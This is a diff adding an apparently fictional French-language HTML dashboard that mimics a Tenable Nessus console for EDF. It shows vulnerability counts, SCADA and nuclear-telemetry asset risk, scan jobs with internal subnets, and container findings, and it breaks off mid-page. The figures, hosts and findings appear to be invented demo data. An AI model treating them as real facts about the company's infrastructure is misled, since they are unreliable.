@@ -1,0 +1,1032 @@
+<!DOCTYPE html>
+<html lang="fr" class="h-full bg-slate-100">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tenable Nessus Enterprise - EDF Cyber Defense Console</title>
+
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Lucide Icons -->
+    <script src="https://unpkg.com/lucide@latest"></script>
+
+    <!-- Google Fonts: Inter & JetBrains Mono -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        tenable: {
+                            dark: '#0F172A',
+                            navy: '#1E293B',
+                            slate: '#334155',
+                            accent: '#0284C7',
+                            cyan: '#0EA5E9',
+                            cyanLight: '#E0F2FE',
+                            border: '#CBD5E1'
+                        },
+                        severity: {
+                            critical: '#DC2626',
+                            criticalBg: '#FEF2F2',
+                            high: '#EA580C',
+                            highBg: '#FFEDD5',
+                            medium: '#D97706',
+                            mediumBg: '#FEF3C7',
+                            low: '#2563EB',
+                            lowBg: '#EFF6FF',
+                            info: '#64748B',
+                            infoBg: '#F1F5F9'
+                        }
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['JetBrains Mono', 'monospace']
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: #F1F5F9; }
+        ::-webkit-scrollbar-thumb { background: #94A3B8; border-radius: 4px; }
+
+        .nessus-card {
+            background-color: #FFFFFF;
+            border: 1px solid #E2E8F0;
+            border-radius: 10px;
+            box-shadow: 0 1px 3px rgba(15, 23, 42, 0.05);
+            transition: all 0.2s ease;
+        }
+        .nessus-card:hover {
+            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.08);
+            border-color: #93C5FD;
+        }
+
+        .pulse-critical {
+            animation: pulseCritical 1.8s infinite;
+        }
+        @keyframes pulseCritical {
+            0% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.6); }
+            70% { box-shadow: 0 0 0 8px rgba(220, 38, 38, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0); }
+        }
+    </style>
+</head>
+<body class="h-full text-slate-800 font-sans flex flex-col bg-[#F8FAFC]">
+
+    <!-- 1. TOP EDF & TENABLE CONSOLE HEADER -->
+    <header class="bg-tenable-dark text-white border-b border-slate-700 sticky top-0 z-40 shadow-md">
+        <!-- Top Institutional Ribbon -->
+        <div class="bg-[#090D16] px-4 py-1.5 border-b border-slate-800 text-[11px] font-mono flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <span class="flex h-2.5 w-2.5 relative">
+                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
+                    <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
+                </span>
+                <span class="text-slate-300 font-semibold tracking-wide">EDF SOC-NATIONAL • DIVISION SÉCURITÉ DES INFRASTRUCTURES CRITIQUES (CERT-EDF)</span>
+            </div>
+            <div class="hidden md:flex items-center gap-4 text-slate-400 text-[11px]">
+                <span>Nessus Engine v10.8.2-EDF-BUILD</span>
+                <span>•</span>
+                <span>Feeds Plugins: <strong class="text-emerald-400">20261019.2 (A jour)</strong></span>
+                <span>•</span>
+                <span id="header-time">UTC 13:44:00</span>
+            </div>
+        </div>
+
+        <!-- Main Header Controls -->
+        <div class="max-w-[1800px] mx-auto px-4 py-3 flex flex-wrap items-center justify-between gap-4">
+            
+            <!-- Brand & Console Title -->
+            <div class="flex items-center gap-4">
+                <div class="flex items-center gap-3">
+                    <div class="w-10 h-10 rounded-xl bg-tenable-accent p-2 flex items-center justify-center text-white shadow-lg font-black text-xl">
+                        <i data-lucide="shield-alert" class="w-6 h-6"></i>
+                    </div>
+                    <div>
+                        <div class="flex items-center gap-2">
+                            <h1 class="font-extrabold text-white text-base tracking-tight">tenable<span class="text-tenable-cyan">.io</span></h1>
+                            <span class="bg-tenable-slate text-slate-200 text-[10px] font-mono px-2 py-0.5 rounded border border-slate-600">Nessus Expert Enterprise</span>
+                        </div>
+                        <p class="text-xs text-slate-400">Scan d'Infrastructures & Sécurité des Images de Conteneurs</p>
+                    </div>
+                </div>
+
+                <div class="hidden xl:block h-7 w-px bg-slate-700"></div>
+
+                <!-- Scope Selector -->
+                <div class="hidden lg:flex items-center gap-2 bg-tenable-navy border border-slate-700 px-3 py-1.5 rounded-lg">
+                    <i data-lucide="globe" class="w-3.5 h-3.5 text-tenable-cyan"></i>
+                    <span class="text-xs text-slate-300 font-medium">Périmètre de Scan:</span>
+                    <select id="scope-select" onchange="switchScope(this.value)" class="bg-tenable-dark text-xs font-bold text-white border border-slate-600 rounded px-2 py-0.5 focus:outline-none cursor-pointer">
+                        <option value="all">EDF Global (Nucléaire + OT Grid + SI Siège)</option>
+                        <option value="nuclear">EDF CNPE - Parcs Nucléaires (DMZ OT)</option>
+                        <option value="k8s">OpenShift & Clusters K8s Production</option>
+                        <option value="sap">SI Central & ERP SAP Gros</option>
+                    </select>
+                </div>
+            </div>
+
+            <!-- Header Quick Action Bar -->
+            <div class="flex items-center gap-3">
+                <div class="hidden sm:flex items-center gap-2 bg-tenable-navy border border-slate-700 px-3 py-1.5 rounded-lg font-mono text-xs text-slate-200">
+                    <i data-lucide="activity" class="w-4 h-4 text-emerald-400"></i>
+                    <span>Score d'Exposition (AES):</span>
+                    <strong class="text-white text-sm font-extrabold">642 / 1000</strong>
+                </div>
+
+                <button onclick="openLaunchScanModal()" class="bg-tenable-accent hover:bg-sky-600 text-white font-bold text-xs px-3.5 py-2 rounded-lg transition-all flex items-center gap-2 shadow-md">
+                    <i data-lucide="play-circle" class="w-4 h-4"></i>
+                    <span>Lancer un Scan</span>
+                </button>
+
+                <button onclick="exportScanReport()" class="bg-tenable-navy hover:bg-slate-700 text-slate-200 border border-slate-600 font-bold text-xs px-3 py-2 rounded-lg transition-all flex items-center gap-2">
+                    <i data-lucide="download" class="w-4 h-4 text-slate-300"></i>
+                    <span class="hidden md:inline">Rapport</span>
+                </button>
+            </div>
+
+        </div>
+    </header>
+
+    <!-- 2. NAVIGATION BAR -->
+    <nav class="bg-white border-b border-tenable-border shadow-xs sticky top-[73px] z-30">
+        <div class="max-w-[1800px] mx-auto px-4 py-2 flex flex-wrap items-center justify-between gap-4">
+            
+            <div class="flex items-center gap-1 sm:gap-2">
+                <button onclick="switchTab('dashboard')" id="tab-dashboard" class="px-3.5 py-2 rounded-lg text-xs font-bold transition-all bg-tenable-accent text-white flex items-center gap-2">
+                    <i data-lucide="layout-dashboard" class="w-4 h-4"></i>
+                    <span>Tableau de Bord</span>
+                </button>
+                <button onclick="switchTab('vulnerabilities')" id="tab-vulnerabilities" class="px-3.5 py-2 rounded-lg text-xs font-bold transition-all text-slate-600 hover:text-tenable-accent hover:bg-slate-100 flex items-center gap-2">
+                    <i data-lucide="shield-alert" class="w-4 h-4"></i>
+                    <span>Vulnérabilités Actives</span>
+                    <span class="bg-severity-critical text-white font-mono font-bold text-[10px] px-1.5 py-0.2 rounded-full">27</span>
+                </button>
+                <button onclick="switchTab('containers')" id="tab-containers" class="px-3.5 py-2 rounded-lg text-xs font-bold transition-all text-slate-600 hover:text-tenable-accent hover:bg-slate-100 flex items-center gap-2">
+                    <i data-lucide="box" class="w-4 h-4"></i>
+                    <span>Sécurité Conteneurs (K8s/Docker)</span>
+                    <span class="bg-tenable-accent text-white font-mono font-bold text-[10px] px-1.5 py-0.2 rounded-full">342</span>
+                </button>
+                <button onclick="switchTab('scans')" id="tab-scans" class="px-3.5 py-2 rounded-lg text-xs font-bold transition-all text-slate-600 hover:text-tenable-accent hover:bg-slate-100 flex items-center gap-2">
+                    <i data-lucide="radar" class="w-4 h-4"></i>
+                    <span>Tâches & Moteurs de Scan</span>
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                </button>
+            </div>
+
+            <!-- Global Search Bar -->
+            <div class="relative w-full sm:w-80">
+                <i data-lucide="search" class="w-4 h-4 absolute left-3 top-2.5 text-slate-400"></i>
+                <input type="text" id="global-search-input" onkeyup="handleGlobalSearch(this.value)" placeholder="Rechercher par CVE, Hôte, Image ou IP..." class="w-full bg-slate-50 border border-slate-300 text-xs text-slate-800 rounded-lg pl-9 pr-3 py-2 focus:outline-none focus:border-tenable-accent focus:bg-white transition-all">
+            </div>
+
+        </div>
+    </nav>
+
+    <!-- 3. MAIN WORKSPACE CONTAINER -->
+    <main class="max-w-[1800px] mx-auto px-4 py-6 flex-1 w-full space-y-6">
+
+        <!-- ==================== TAB 1: EXECUTIVE DASHBOARD ==================== -->
+        <div id="view-dashboard" class="space-y-6">
+            
+            <!-- KPI Summary Cards Grid -->
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-4">
+                
+                <div class="nessus-card p-4 space-y-2 border-l-4 border-l-tenable-accent">
+                    <div class="flex justify-between items-center text-xs text-slate-500 font-medium">
+                        <span>Hôtes Découverts & Scannés</span>
+                        <i data-lucide="server" class="w-4 h-4 text-tenable-accent"></i>
+                    </div>
+                    <div class="text-2xl font-black font-mono text-slate-900" id="kpi-hosts">1,482</div>
+                    <div class="text-[11px] text-slate-500 flex items-center gap-1">
+                        <span class="text-emerald-600 font-bold">12 nouveaux</span> découverts aujourd'hui
+                    </div>
+                </div>
+
+                <div class="nessus-card p-4 space-y-2 border-l-4 border-l-severity-critical">
+                    <div class="flex justify-between items-center text-xs text-slate-500 font-medium">
+                        <span>Vulnérabilités CRITIQUES</span>
+                        <i data-lucide="alert-octagon" class="w-4 h-4 text-severity-critical"></i>
+                    </div>
+                    <div class="text-2xl font-black font-mono text-severity-critical" id="kpi-critical">27</div>
+                    <div class="text-[11px] text-slate-500 font-mono">
+                        VPR Moins Récent: <strong class="text-red-700">9.8 (Urgent)</strong>
+                    </div>
+                </div>
+
+                <div class="nessus-card p-4 space-y-2 border-l-4 border-l-severity-high">
+                    <div class="flex justify-between items-center text-xs text-slate-500 font-medium">
+                        <span>Vulnérabilités ÉLEVÉES</span>
+                        <i data-lucide="alert-triangle" class="w-4 h-4 text-severity-high"></i>
+                    </div>
+                    <div class="text-2xl font-black font-mono text-severity-high" id="kpi-high">114</div>
+                    <div class="text-[11px] text-slate-500">Correctifs disponibles: <strong>92%</strong></div>
+                </div>
+
+                <div class="nessus-card p-4 space-y-2 border-l-4 border-l-tenable-cyan">
+                    <div class="flex justify-between items-center text-xs text-slate-500 font-medium">
+                        <span>Images de Conteneurs Scannées</span>
+                        <i data-lucide="box" class="w-4 h-4 text-tenable-cyan"></i>
+                    </div>
+                    <div class="text-2xl font-black font-mono text-slate-900" id="kpi-containers">342</div>
+                    <div class="text-[11px] text-slate-500">OpenShift / Harbor EDF Registry</div>
+                </div>
+
+                <div class="nessus-card p-4 space-y-2 border-l-4 border-l-emerald-500">
+                    <div class="flex justify-between items-center text-xs text-slate-500 font-medium">
+                        <span>Score de Risque VPR Moyen</span>
+                        <i data-lucide="activity" class="w-4 h-4 text-emerald-600"></i>
+                    </div>
+                    <div class="text-2xl font-black font-mono text-slate-900">4.8 / 10</div>
+                    <div class="text-[11px] text-emerald-600 font-semibold">-0.4 vs mois dernier</div>
+                </div>
+
+            </div>
+
+            <!-- Charts & Visual Analytics Section -->
+            <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                
+                <!-- Vulnerability Severity Breakdown Donut Chart -->
+                <div class="nessus-card p-5 space-y-4">
+                    <div class="border-b border-slate-200 pb-3 flex justify-between items-center">
+                        <h3 class="font-extrabold text-slate-800 text-sm flex items-center gap-2">
+                            <i data-lucide="pie-chart" class="w-4 h-4 text-tenable-accent"></i>
+                            Répartition des Vulnérabilités
+                        </h3>
+                        <span class="text-[11px] font-mono text-slate-500">Total: 1,842</span>
+                    </div>
+
+                    <!-- CSS SVG Donut Visual -->
+                    <div class="flex flex-col sm:flex-row items-center justify-between gap-6 py-2">
+                        <div class="relative w-40 h-40 shrink-0">
+                            <svg class="w-full h-full transform -rotate-90" viewBox="0 0 36 36">
+                                <!-- Background Circle -->
+                                <path class="text-slate-100" stroke-width="4.5" stroke="currentColor" fill="none" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                                <!-- Info / Low Segment -->
+                                <path class="text-slate-400" stroke-dasharray="100, 100" stroke-width="4.5" stroke="currentColor" fill="none" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                                <!-- Medium Segment -->
+                                <path class="text-amber-500" stroke-dasharray="45, 100" stroke-width="4.5" stroke="currentColor" fill="none" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                                <!-- High Segment -->
+                                <path class="text-orange-600" stroke-dasharray="20, 100" stroke-width="4.5" stroke="currentColor" fill="none" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                                <!-- Critical Segment -->
+                                <path class="text-red-600" stroke-dasharray="6, 100" stroke-width="4.5" stroke="currentColor" fill="none" d="M18 2.0845 a 15.9155 15.9155 0 0 1 0 31.831 a 15.9155 15.9155 0 0 1 0 -31.831" />
+                            </svg>
+                            <div class="absolute inset-0 flex flex-col items-center justify-center text-center">
+                                <span class="text-2xl font-black font-mono text-slate-800">27</span>
+                                <span class="text-[10px] font-bold uppercase text-red-600 tracking-wider">Critiques</span>
+                            </div>
+                        </div>
+
+                        <!-- Legend -->
+                        <div class="w-full space-y-2 text-xs font-mono">
+                            <div class="flex justify-between items-center p-1.5 rounded bg-red-50 border border-red-100">
+                                <div class="flex items-center gap-2">
+                                    <span class="w-3 h-3 rounded-xs bg-severity-critical"></span>
+                                    <span class="font-bold text-red-900">CRITIQUE</span>
+                                </div>
+                                <strong class="text-red-700">27 (1.5%)</strong>
+                            </div>
+
+                            <div class="flex justify-between items-center p-1.5 rounded bg-orange-50 border border-orange-100">
+                                <div class="flex items-center gap-2">
+                                    <span class="w-3 h-3 rounded-xs bg-severity-high"></span>
+                                    <span class="font-bold text-orange-900">ÉLEVÉ</span>
+                                </div>
+                                <strong class="text-orange-700">114 (6.2%)</strong>
+                            </div>
+
+                            <div class="flex justify-between items-center p-1.5 rounded bg-amber-50 border border-amber-100">
+                                <div class="flex items-center gap-2">
+                                    <span class="w-3 h-3 rounded-xs bg-severity-medium"></span>
+                                    <span class="font-bold text-amber-900">MOYEN</span>
+                                </div>
+                                <strong class="text-amber-700">412 (22.3%)</strong>
+                            </div>
+
+                            <div class="flex justify-between items-center p-1.5 rounded bg-slate-50 border border-slate-200">
+                                <div class="flex items-center gap-2">
+                                    <span class="w-3 h-3 rounded-xs bg-slate-400"></span>
+                                    <span class="font-bold text-slate-700">FAIBLE / INFO</span>
+                                </div>
+                                <strong class="text-slate-600">1,289 (70.0%)</strong>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Top 5 Most Vulnerable EDF Asset Groups -->
+                <div class="nessus-card p-5 space-y-4 lg:col-span-2">
+                    <div class="border-b border-slate-200 pb-3 flex justify-between items-center">
+                        <h3 class="font-extrabold text-slate-800 text-sm flex items-center gap-2">
+                            <i data-lucide="layers" class="w-4 h-4 text-tenable-accent"></i>
+                            Groupes d'Actifs EDF les Plus Exposés (CyberExposure Risk Index)
+                        </h3>
+                        <span class="text-xs font-mono text-slate-500">Par VPR & Criticité</span>
+                    </div>
+
+                    <div class="space-y-3 text-xs">
+                        <!-- Asset 1 -->
+                        <div class="p-3 bg-slate-50 rounded-lg border border-slate-200 space-y-1.5">
+                            <div class="flex justify-between items-center font-bold">
+                                <span class="text-slate-900 font-sans flex items-center gap-2">
+                                    <i data-lucide="cpu" class="w-4 h-4 text-red-600"></i>
+                                    Passerelles Téléconduite SCADA Postes Électriques (OT Zone 3)
+                                </span>
+                                <span class="text-red-600 font-mono">Score Risque VPR: 9.6 / 10</span>
+                            </div>
+                            <div class="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
+                                <div class="bg-red-600 h-full w-[96%]"></div>
+                            </div>
+                            <div class="flex justify-between text-[11px] text-slate-500 font-mono pt-0.5">
+                                <span>34 Hôtes (10.142.8.0/24)</span>
+                                <span>8 Critiques • Log4j & Protocoles IEC-60870 obsolètes</span>
+                            </div>
+                        </div>
+
+                        <!-- Asset 2 -->
+                        <div class="p-3 bg-slate-50 rounded-lg border border-slate-200 space-y-1.5">
+                            <div class="flex justify-between items-center font-bold">
+                                <span class="text-slate-900 font-sans flex items-center gap-2">
+                                    <i data-lucide="box" class="w-4 h-4 text-orange-600"></i>
+                                    Cluster OpenShift K8s Production (Ingestion Télémétrie Nucléaire)
+                                </span>
+                                <span class="text-orange-600 font-mono">Score Risque VPR: 8.8 / 10</span>
+                            </div>
+                            <div class="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
+                                <div class="bg-orange-600 h-full w-[88%]"></div>
+                            </div>
+                            <div class="flex justify-between text-[11px] text-slate-500 font-mono pt-0.5">
+                                <span>128 Pods (k8s-prod.edf.internal)</span>
+                                <span>5 Critiques • Nginx Base Image Vulnerabilities</span>
+                            </div>
+                        </div>
+
+                        <!-- Asset 3 -->
+                        <div class="p-3 bg-slate-50 rounded-lg border border-slate-200 space-y-1.5">
+                            <div class="flex justify-between items-center font-bold">
+                                <span class="text-slate-900 font-sans flex items-center gap-2">
+                                    <i data-lucide="database" class="w-4 h-4 text-amber-600"></i>
+                                    Progiciel SAP ERP Marchés de Gros & Facturation Énergie
+                                </span>
+                                <span class="text-amber-600 font-mono">Score Risque VPR: 7.2 / 10</span>
+                            </div>
+                            <div class="w-full bg-slate-200 h-2 rounded-full overflow-hidden">
+                                <div class="bg-amber-500 h-full w-[72%]"></div>
+                            </div>
+                            <div class="flex justify-between text-[11px] text-slate-500 font-mono pt-0.5">
+                                <span>12 Serveurs SAP HANA</span>
+                                <span>2 Critiques • Outdated Linux Kernel</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- Recent Scan Jobs Table -->
+            <div class="nessus-card p-5 space-y-4">
+                <div class="border-b border-slate-200 pb-3 flex justify-between items-center">
+                    <div>
+                        <h3 class="font-extrabold text-slate-800 text-sm flex items-center gap-2">
+                            <i data-lucide="radar" class="w-4 h-4 text-tenable-accent"></i>
+                            Tâches de Scan Nessus Récentes & Statuts Temps Réel
+                        </h3>
+                        <p class="text-xs text-slate-500">Moteurs Nessus Network Monitor & Scanners de Conteneurs Harbor</p>
+                    </div>
+
+                    <button onclick="switchTab('scans')" class="text-xs text-tenable-accent font-bold hover:underline">
+                        Voir Toutes les Tâches (18) &rarr;
+                    </button>
+                </div>
+
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs font-mono">
+                        <thead class="bg-slate-100 text-slate-700 uppercase font-sans text-[11px] font-extrabold">
+                            <tr>
+                                <th class="p-3">Nom de la Tâche de Scan</th>
+                                <th class="p-3">Type de Scan</th>
+                                <th class="p-3">Cible / Périmètre</th>
+                                <th class="p-3">Progression / Statut</th>
+                                <th class="p-3">Vuln. Découvertes</th>
+                                <th class="p-3">Dernier Exécuté</th>
+                                <th class="p-3 text-right">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-slate-200 font-mono text-slate-800">
+                            <!-- Job 1 -->
+                            <tr class="hover:bg-slate-50 transition-colors">
+                                <td class="p-3 font-bold text-slate-900 font-sans flex items-center gap-2">
+                                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-ping"></span>
+                                    Scan Hebdo SCADA OT Substation Grid
+                                </td>
+                                <td class="p-3"><span class="bg-purple-100 text-purple-800 px-2 py-0.5 rounded font-bold text-[10px]">OT/SCADA Protocol</span></td>
+                                <td class="p-3 text-slate-600">10.142.8.0/24 (Substations)</td>
+                                <td class="p-3">
+                                    <div class="space-y-1">
+                                        <div class="flex justify-between text-[10px]">
+                                            <span class="text-emerald-700 font-bold">EN COURS (68%)</span>
+                                            <span>ETA: 12 min</span>
+                                        </div>
+                                        <div class="w-28 bg-slate-200 h-1.5 rounded-full overflow-hidden">
+                                            <div class="bg-emerald-500 h-full w-[68%]"></div>
+                                        </div>
+                                    </div>
+                                </td>
+                                <td class="p-3">
+                                    <span class="text-red-600 font-bold">8 Crit</span> • <span class="text-orange-600 font-bold">14 Élev</span>
+                                </td>
+                                <td class="p-3 text-slate-500">Aujourd'hui 13:20</td>
+                                <td class="p-3 text-right">
+                                    <button onclick="openScanDetails('scan-1')" class="bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[11px] px-2.5 py-1 rounded">Détails</button>
+                                </td>
+                            </tr>
+
+                            <!-- Job 2 -->
+                            <tr class="hover:bg-slate-50 transition-colors">
+                                <td class="p-3 font-bold text-slate-900 font-sans">Audit Registre Conteneurs OpenShift</td>
+                                <td class="p-3"><span class="bg-sky-100 text-sky-800 px-2 py-0.5 rounded font-bold text-[10px]">Nessus Container Audit</span></td>
+                                <td class="p-3 text-slate-600">edf-registry.internal/harbor</td>
+                                <td class="p-3">
+                                    <span class="bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded text-[10px]">TERMINÉ</span>
+                                </td>
+                                <td class="p-3">
+                                    <span class="text-red-600 font-bold">5 Crit</span> • <span class="text-orange-600 font-bold">22 Élev</span>
+                                </td>
+                                <td class="p-3 text-slate-500">Aujourd'hui 11:00</td>
+                                <td class="p-3 text-right">
+                                    <button onclick="openScanDetails('scan-2')" class="bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[11px] px-2.5 py-1 rounded">Détails</button>
+                                </td>
+                            </tr>
+
+                            <!-- Job 3 -->
+                            <tr class="hover:bg-slate-50 transition-colors">
+                                <td class="p-3 font-bold text-slate-900 font-sans">Sweep Réseau Interne Datacenter Saclay</td>
+                                <td class="p-3"><span class="bg-slate-100 text-slate-800 px-2 py-0.5 rounded font-bold text-[10px]">Full Network Scan</span></td>
+                                <td class="p-3 text-slate-600">10.200.0.0/16 (DC Saclay)</td>
+                                <td class="p-3">
+                                    <span class="bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded text-[10px]">TERMINÉ</span>
+                                </td>
+                                <td class="p-3">
+                                    <span class="text-red-600 font-bold">14 Crit</span> • <span class="text-orange-600 font-bold">78 Élev</span>
+                                </td>
+                                <td class="p-3 text-slate-500">Hier 23:00</td>
+                                <td class="p-3 text-right">
+                                    <button onclick="openScanDetails('scan-3')" class="bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-[11px] px-2.5 py-1 rounded">Détails</button>
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+
+        </div>
+
+        <!-- ==================== TAB 2: ACTIVE VULNERABILITIES EXPLORER ==================== -->
+        <div id="view-vulnerabilities" class="hidden space-y-6">
+            <div class="nessus-card p-5 space-y-4">
+                <div class="flex flex-wrap items-center justify-between gap-4 border-b border-slate-200 pb-3">
+                    <div>
+                        <h3 class="font-extrabold text-slate-800 text-base flex items-center gap-2">
+                            <i data-lucide="shield-alert" class="w-5 h-5 text-severity-critical"></i>
+                            Explorateur des Vulnérabilités Détectées (Priorisation VPR Nessus)
+                        </h3>
+                        <p class="text-xs text-slate-500">Triage temps réel croisant CVSS v3, VPR (Threat Intelligence Tenable) et criticité des équipements EDF</p>
+                    </div>
+
+                    <!-- Severity Filter Buttons -->
+                    <div class="flex items-center gap-1.5 text-xs font-mono">
+                        <button onclick="filterVulns('ALL')" id="btn-vuln-all" class="px-2.5 py-1 rounded-lg bg-tenable-navy text-white font-bold">Tous (5)</button>
+                        <button onclick="filterVulns('CRITICAL')" id="btn-vuln-critical" class="px-2.5 py-1 rounded-lg bg-red-100 hover:bg-red-200 text-red-800 font-bold">Critical</button>
+                        <button onclick="filterVulns('HIGH')" id="btn-vuln-high" class="px-2.5 py-1 rounded-lg bg-orange-100 hover:bg-orange-200 text-orange-800 font-bold">High</button>
+                    </div>
+                </div>
+
+                <!-- Vulnerabilities Table -->
+                <div class="overflow-x-auto">
+                    <table class="w-full text-left text-xs font-mono">
+                        <thead class="bg-slate-100 text-slate-700 uppercase font-sans text-[11px] font-extrabold">
+                            <tr>
+                                <th class="p-3">Sévérité</th>
+                                <th class="p-3">Plugin ID & Nom Vulnérabilité</th>
+                                <th class="p-3">CVE ID</th>
+                                <th class="p-3">VPR Score</th>
+                                <th class="p-3">CVSS v3</th>
+                                <th class="p-3">Hôte / Cible Effectuée</th>
+                                <th class="p-3 text-right">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="vuln-table-body" class="divide-y divide-slate-200 font-mono text-slate-800">
+                            <!-- Populated dynamically by JS -->
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== TAB 3: CONTAINER IMAGE SECURITY SCANNER ==================== -->
+        <div id="view-containers" class="hidden space-y-6">
+            <div class="nessus-card p-5 space-y-4">
+                <div class="border-b border-slate-200 pb-3 flex flex-wrap justify-between items-center gap-4">
+                    <div>
+                        <h3 class="font-extrabold text-slate-800 text-base flex items-center gap-2">
+                            <i data-lucide="box" class="w-5 h-5 text-tenable-cyan"></i>
+                            Nessus Container Security - Inspecteur d'Images K8s & Docker
+                        </h3>
+                        <p class="text-xs text-slate-500">Analyse statique & dynamique des couches applicatives, vulnérabilités OS base image et secrets fuités</p>
+                    </div>
+
+                    <div class="flex items-center gap-2">
+                        <span class="text-xs font-mono text-slate-500">Registre Cible:</span>
+                        <span class="bg-sky-100 text-sky-900 font-mono font-bold text-xs px-2.5 py-1 rounded-lg border border-sky-300">edf-registry.internal/harbor</span>
+                    </div>
+                </div>
+
+                <!-- Container Images Grid/Table -->
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                    
+                    <!-- Container Card 1 -->
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-3 hover:border-tenable-accent transition-all">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <span class="bg-slate-200 text-slate-800 font-mono font-bold text-[10px] px-2 py-0.5 rounded">Docker / OpenShift</span>
+                                <h4 class="font-mono font-bold text-slate-900 text-xs mt-1">grid-control/relay-service:v2.4</h4>
+                            </div>
+                            <span class="bg-red-100 text-red-800 border border-red-300 font-bold text-[10px] px-2 py-0.5 rounded">2 Critiques</span>
+                        </div>
+
+                        <div class="p-2.5 bg-white rounded-lg border border-slate-200 space-y-1.5 text-[11px] font-mono">
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Base Image OS:</span>
+                                <strong class="text-red-600">Alpine Linux 3.16 (EOL Vulnerable)</strong>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Détection Secrets:</span>
+                                <strong class="text-red-700 font-bold flex items-center gap-1">
+                                    <i data-lucide="key" class="w-3 h-3"></i> Token Clé API Hardcodée (Layer 3)
+                                </strong>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Empreinte Digest SHA:</span>
+                                <span class="text-slate-600">sha256:a8f921b0e...</span>
+                            </div>
+                        </div>
+
+                        <div class="flex justify-between items-center text-xs pt-1">
+                            <span class="text-slate-500 font-mono text-[11px]">Dernier scan: il y a 2h</span>
+                            <button onclick="openContainerDetails('img-1')" class="bg-tenable-accent hover:bg-sky-600 text-white font-bold text-[11px] px-3 py-1 rounded-lg">Inspecter Couches</button>
+                        </div>
+                    </div>
+
+                    <!-- Container Card 2 -->
+                    <div class="p-4 bg-slate-50 rounded-xl border border-slate-200 space-y-3 hover:border-tenable-accent transition-all">
+                        <div class="flex justify-between items-start">
+                            <div>
+                                <span class="bg-slate-200 text-slate-800 font-mono font-bold text-[10px] px-2 py-0.5 rounded">Kubernetes Pod</span>
+                                <h4 class="font-mono font-bold text-slate-900 text-xs mt-1">nuclear-telemetry/ingestion-pod:latest</h4>
+                            </div>
+                            <span class="bg-orange-100 text-orange-800 border border-orange-300 font-bold text-[10px] px-2 py-0.5 rounded">1 Élevée</span>
+                        </div>
+
+                        <div class="p-2.5 bg-white rounded-lg border border-slate-200 space-y-1.5 text-[11px] font-mono">
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Base Image OS:</span>
+                                <strong class="text-slate-800">RedHat Universal Base Image (UBI 9.2)</strong>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Détection Secrets:</span>
+                                <strong class="text-emerald-600">Aucun secret détecté</strong>
+                            </div>
+                            <div class="flex justify-between">
+                                <span class="text-slate-500">Package à risque:</span>
+                                <span class="text-orange-700 font-bold">libxml2-2.9.13 (CVE-2023-45322)</span>
+                            </div>
+                        </div>
+
+                        <div class="flex justify-between items-center text-xs pt-1">
+                            <span class="text-slate-500 font-mono text-[11px]">Dernier scan: il y a 4h</span>
+                            <button onclick="openContainerDetails('img-2')" class="bg-tenable-accent hover:bg-sky-600 text-white font-bold text-[11px] px-3 py-1 rounded-lg">Inspecter Couches</button>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+
+        <!-- ==================== TAB 4: SCANS & SCAN ENGINES ==================== -->
+        <div id="view-scans" class="hidden space-y-6">
+            <div class="nessus-card p-5 space-y-4">
+                <div class="border-b border-slate-200 pb-3">
+                    <h3 class="font-extrabold text-slate-800 text-base flex items-center gap-2">
+                        <i data-lucide="cpu" class="w-5 h-5 text-tenable-accent"></i>
+                        Moteurs Nessus Scanners & Agents Déployés
+                    </h3>
